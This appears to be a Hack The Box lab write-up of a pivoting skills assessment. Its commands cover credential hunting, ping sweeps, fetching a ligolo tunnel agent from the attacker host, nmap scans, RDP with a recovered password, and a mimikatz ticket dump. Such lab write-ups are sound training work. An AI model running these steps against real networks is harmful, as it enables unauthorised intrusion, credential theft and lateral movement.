---
platform: hackthebox
difficulty: unknown
status: Completed
date: 2026-09-28
tags:
---
# HTB: Skills Assessment

**Targets:** `10.129.229.129`  
You will find the web shell pictured below when you browse to support.inlanefreight.local or the target IP above.
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928112151.png)

---

## 01 - Scope
### Assignment:
A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a `web shell` in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are `below`:
### Objectives:
- Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
- Use the web shell access to enumerate and pivot to an internal host.
- Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated `flag`.
- Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
- Grab `any/all` flags that can be found.
**Primary Goals:**
  - [x] Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.
  - [x] Submit the credentials found in the user's home directory. (Format: user:password)
  - [x] Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.
  - [x] In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?
  - [x] For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.
  - [x] Submit the contents of C:\Flag.txt located on the Domain Controller.


---

## 02 - Procedure
1. First I "connected" to the webshell.
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928112151.png)

2. I then searched for files containing credentials...
```bash
sudo grep -rnwIi --color=auto -E "cred|login|user|password" /home
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928113023.png)

3. ... and found them in the file `for-admin-eyes-only`:
```bash
cat /home/webadmin/for-admin-eyes-only
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928113212.png)

4. Afterwards I executed a pingsweep on the network `172.16.5.0/24` in order to find the other host and found `172.16.5.35`:
```bash
for i in $(seq 1 254); do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928113648.png)

5. I then downloaded `ligolo` on the webshell host and setup a tunnel between my attack box and the webshell host. This way I can access the target network `172.16.5.0/24` from my attack box:
```bash
wget http://10.10.14.141:8000/ligolo-ng_agent_0.9.1_linux_amd64
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928114526.png)
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928114543.png)
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928114727.png)

6. I now did a fast and detailed `nmap-scan` of the target:
```bash
nmap -p- --min-rate 500 --max-retries 1 -v -n 172.16.5.35 > default-nmap
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928115409.png)

```bash
nmap -p 22,135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671,49672,49673 -sC -sV 172.16.5.35 > detailed-nmap
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928115434.png)

7. And connected to tit via `RDP` with the credentials obtained earlier and retrieved the flag:
```bash
xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /dynamic-resolution /cert:ignore
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928115726.png)


8. In order to find the next Host I executed a `Ping sweep` again, this time over the cmd and found nothing, except myself: 
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928120407.png)

9. I also tried `arp -a` and `netstat -r`, but without success:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928120957.png)


10. So I executed `Advanced IP Sacnner` and found the Host `PIVOTWIN10` with the IP `172.16.6.25` and another device with IP `172.16.6.45`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928121813.png)

11. Now I setup the `double pivot` over the windows server:
```cmd
.\ligolo-ng_agent_0.9.1_windows_amd64.exe -connect 172.16.5.150:11601 -ignore-cert
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928123648.png)

12. Even tho I couldn't ping the newly discovered host, I was able to enumerate it using `nmap`:
```bash
nmap -p- --min-rate 500 --max-retries 1 -v -n 172.16.6.25 > pivot2
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928123946.png)

```bash
nmap -p 135,139,445,3389,49665,49669,49670,49671,49672 -sC -sV 172.16.6.25 > pivot2-detailed                                          
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928124215.png)

13. I then executed `mimikatz` and found the credentials of `vfrank`. Which I used to pivot to the next machine via `RDP`:
```cmd
mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit > ticketharvest.txt
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928125146.png)

14. I was now able to retrieve the next flag located in `C:\`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928125424.png)

15. So the next goal was to locate the domain controller. I therefor did, what I've done before. I executed `Advanced IP Scanner` and found the DC `ACADEMY-PIVOT-DC01` with the IP `172.16.10.5`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928125802.png)

16. After checking the mounted share, I also found the last flag from the DC:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260928153057.png)

## 03 - Lesson Learned

Performance can decrease significantly after more than one pivot!